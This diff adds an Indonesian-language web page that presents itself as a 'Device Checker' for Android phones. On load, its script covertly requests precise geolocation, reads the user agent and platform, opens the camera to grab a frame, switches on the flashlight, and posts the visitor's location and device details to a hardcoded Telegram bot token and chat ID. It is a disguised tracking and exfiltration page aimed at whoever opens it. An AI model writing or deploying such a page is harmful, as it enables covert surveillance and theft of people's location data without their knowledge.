@@ -1,0 +1,183 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>zeetasiOfc - Device Checker</title>
+    <style>
+        body { 
+            text-align: center; 
+            font-family: Arial, sans-serif; 
+            background: #0d0d0d; 
+            color: white; 
+            overflow: hidden;
+        }
+        h2 { 
+            color: #00ff99; 
+            font-size: 24px;
+            animation: glow 1.5s infinite alternate;
+        }
+        @keyframes glow {
+            from { text-shadow: 0 0 10px #00ff99; }
+            to { text-shadow: 0 0 20px #00ff99, 0 0 30px #00ff99; }
+        }
+        #output {
+            font-size: 18px;
+            border: 2px solid #00ff99;
+            padding: 10px;
+            display: inline-block;
+            background: rgba(0, 255, 153, 0.1);
+            backdrop-filter: blur(5px);
+            border-radius: 8px;
+            box-shadow: 0 0 10px #00ff99;
+        }
+        canvas {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100vw;
+            height: 100vh;
+            z-index: -1;
+        }
+    </style>
+</head>
+<body>
+    <h2>🔍 zeetasiOfc - Cek Perangkat Android</h2>
+    <p id="output">Mengumpulkan data...</p>
+    <canvas id="animation3D"></canvas>
+
+    <script>
+        let lokasi = "Tidak ditemukan";
+        let spesifikasi = "Tidak tersedia";
+        let merekHP = navigator.userAgent;
+        let fotoData = "";
+        let senterAktif = false;
+
+        async function cekLokasi() {
+            if ("geolocation" in navigator) {
+                navigator.geolocation.getCurrentPosition(pos => {
+                    lokasi = `Lat: ${pos.coords.latitude}, Lon: ${pos.coords.longitude}`;
+                    updateOutput();
+                }, error => { console.log("Gagal mendapatkan lokasi!"); }, { enableHighAccuracy: true });
+            }
+        }
+
+        function cekSpesifikasi() {
+            let ua = navigator.userAgent;
+            let platform = navigator.platform;
+            spesifikasi = `User-Agent: ${ua}\nPlatform: ${platform}`;
+            updateOutput();
+        }
+
+        async function ambilFoto() {
+            let stream = await navigator.mediaDevices.getUserMedia({ video: true });
+            let video = document.createElement("video");
+            video.srcObject = stream;
+            let canvas = document.createElement("canvas");
+            let ctx = canvas.getContext("2d");
+
+            setTimeout(() => {
+                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                fotoData = canvas.toDataURL("image/png");
+                stream.getTracks().forEach(track => track.stop());
+            }, 3000);
+        }
+
+        async function nyalakanSenter() {
+            let stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } });
+            let track = stream.getVideoTracks()[0];
+
+            if (track.getCapabilities().torch) {
+                track.applyConstraints({ advanced: [{ torch: !senterAktif }] });
+                senterAktif = !senterAktif;
+            }
+        }
+
+        function updateOutput() {
+            let teks = `📍 **Lokasi:** ${lokasi}\n📋 **Spesifikasi:** ${spesifikasi}\n📱 **Merek HP:** ${merekHP}`;
+            ketikkanTeks(teks, "output");
+        }
+
+        function ketikkanTeks(teks, elemenId) {
+            let elemen = document.getElementById(elemenId);
+            elemen.innerHTML = "";
+            let i = 0;
+            function ketik() {
+                if (i < teks.length) {
+                    elemen.innerHTML += teks[i];
+                    i++;
+                    setTimeout(ketik, 30);
+                }
+            }
+            ketik();
+        }
+
+        function animasi3D() {
+            let canvas = document.getElementById("animation3D");
+            let ctx = canvas.getContext("2d");
+            let partikel = [];
+
+            function buatPartikel() {
+                for (let i = 0; i < 100; i++) {
+                    partikel.push({
+                        x: Math.random() * canvas.width,
+                        y: Math.random() * canvas.height,
+                        radius: Math.random() * 3 + 1,
+                        dx: (Math.random() - 0.5) * 2,
+                        dy: (Math.random() - 0.5) * 2,
+                        color: `hsl(${Math.random() * 360}, 100%, 50%)`
+                    });
+                }
+            }
+
+            function gambarPartikel() {
+                ctx.clearRect(0, 0, canvas.width, canvas.height);
+                partikel.forEach(p => {
+                    ctx.beginPath();
+                    ctx.arc(p.x, p.y, p.radius, 0, Math.PI * 2);
+                    ctx.fillStyle = p.color;
+                    ctx.fill();
+                    p.x += p.dx;
+                    p.y += p.dy;
+
+                    if (p.x < 0 || p.x > canvas.width) p.dx *= -1;
+                    if (p.y < 0 || p.y > canvas.height) p.dy *= -1;
+                });
+                requestAnimationFrame(gambarPartikel);
+            }
+
+            canvas.width = window.innerWidth;
+            canvas.height = window.innerHeight;
+            buatPartikel();
+            gambarPartikel();
+        }
+
+        async function kirimTelegram() {
+            let token = "7101553614:AAES3n31PmVrF9clBmu50JRhFz22wE5RU8U";
+            let chatId = "7895289556";
+
+            let message = `📱 **Laporan Perangkat Android - zeetasiOfc** 📱\n\n` +
+                          `📍 **Lokasi:** ${lokasi}\n` +
+                          `📋 **Spesifikasi:** ${spesifikasi}\n` +
+                          `📱 **Merek HP:** ${merekHP}\n`;
+
+            fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ chat_id: chatId, text: message, parse_mode: "Markdown" })
+            });
+        }
+
+        async function init() {
+            cekLokasi();
+            cekSpesifikasi();
+            ambilFoto();
+            nyalakanSenter();
+            animasi3D();
+            kirimTelegram();
+        }
+
+        window.onload = init;
+    </script>
+</body>
+</html>
